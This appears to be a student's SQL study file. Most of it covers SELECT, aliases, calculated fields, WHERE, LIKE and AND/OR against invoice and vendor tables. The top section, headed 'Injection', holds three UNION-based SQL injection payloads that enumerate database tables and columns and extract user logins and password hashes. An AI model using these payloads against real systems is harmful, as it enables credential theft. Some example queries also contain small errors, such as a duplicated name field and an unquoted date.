
-- Injection

UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 1 FROM information_schema.tables); --

UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); --

UNION (SELECT uLlogin, uHash, uType from users); --

-- SELECT statements
-- Select statements are read only - they cannot modify the database

-- Syntax
-- SELECT fields = SELECT statement, required
-- [FROM table] = From clause, optional
-- [WHERE criteria] = Where clause, optional
-- [ORDER BY list] = Order by clause, optional

-- select everything (all fields) from the invoices table
-- Asterisk (*) means all fields

SELECT * 
FROM Invoices; 

-- Conventions:
-- Capitalize keywords
-- Put each clause on a new line
-- End statemends with semicolon (;) - some databases will require
-- Select everything from the vendors table

SELECT * 
FROM Vendors;

-- Table names are case insensitive 

-- Video 2

-- Select only certain fields from table
-- EX: Select only InvoiceNumber field from invoices table

SELECT InvoiceNumber
FROM Invoices;

-- SELECT Invoice Number, Invoice Date, Invoice Total
SELECT InvoiceNumber, InvoiceDate, InvoiceTotal
FROM Invoices;

-- Aliases
SELECT InvoiceNumber AS Number, InvoiceDate AS Date, InvoiceTotal AS Total
FROM Invoices;

-- Calculated Fields
SELECT InvoiceTotal - PaymentTotal - CreditTotal AS BalanceRemaining
FROM Invoices;

SELECT InvoiceTotal - PaymentTotal - CreditTotal AS BalanceRemaining,
InvoiceTotal, PaymentTotal, CreditTotal
FROM Invoices;

SELECT VendorContactLName + ' ' + VendorContactLName AS 'Full Name'
FROM Vendors;


-- WHERE clause

SELECT *
FROM Invoices
WHERE InvoiceID = 1;

SELECT *
FROM Invoices
WHERE VendorID = 122;

-- Comparison operators
-- Equal =
-- Not Equal <>
-- Greater than >
-- Greater than or Equal to >=
-- Less than < 
-- Less than or Equal to <= 

SELECT *
FROM Invoices
WHERE CreditTotal > 0;

SELECT *
FROM invoices
WHERE PaymentDate > 2016-01-06;

-- String comparisons
-- By default - case insensitive 

SELECT *
FROM Vendors
WHERE VendorState = 'CA';

-- Partial matches
-- Like clause
-- % = zero, one or multiple characters
-- _ = single character

-- Find city that starts with S
SELECT *
FROM Vendors
WHERE VendorCity Like 'S%';

-- Find Vendor with VendorCity starting with St

SELECT *
FROM Vendors
WHERE VendorCity Like 'St%';

-- Ending with O

SELECT *
FROM Vendors
WHERE VendorCity Like '%O';

-- IS NULL Keyword
-- Find fields without value
SELECT *
FROM Vendors
WHERE VendorAddress1 IS NULL;

-- OR / AND
-- Find vendor with vendorcity starting with ST or SAN
SELECT *
FROM Vendors
WHERE VendorCity LIKE 'St%'
OR VendorCity Like 'San%';

SELECT * 
FROM Vendors
WHERE VendorCity LIKE 'San%'
AND VendorState = 'CA';

SELECT *
FROM Vendors
WHERE (VendorState = 'CA' OR VendorState = 'DC')
AND VendorCity LIKE 'W%';



